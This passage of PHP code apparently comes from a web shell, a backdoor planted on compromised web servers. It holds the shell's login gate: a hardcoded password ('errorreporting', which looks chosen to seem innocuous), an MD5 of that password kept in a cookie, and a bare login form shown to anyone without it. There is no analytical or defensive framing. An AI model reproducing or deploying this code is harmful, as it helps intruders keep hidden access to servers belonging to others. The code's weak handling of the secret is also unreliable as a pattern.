...
$et='</td></tr></table>';
$logpwd='errorreporting';
$IP=array();
if(!empty($logpwd)){
if(!empty($_REQUEST['fpassw'])){
if($_REQUEST['fpassw']==$logpwd)setcookie('passw',md5($_REQUEST['fpassw']));
header('Location: '.hlinK());
}
if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($logpwd))die("<html><body><table><form method=post><tr><td>Password:</td><td><input type=hidden name=seC value=about><input type=password name=fpassw></td></tr><tr><td></td><td><input type=submit value=login></form>$et</body></html>");
}
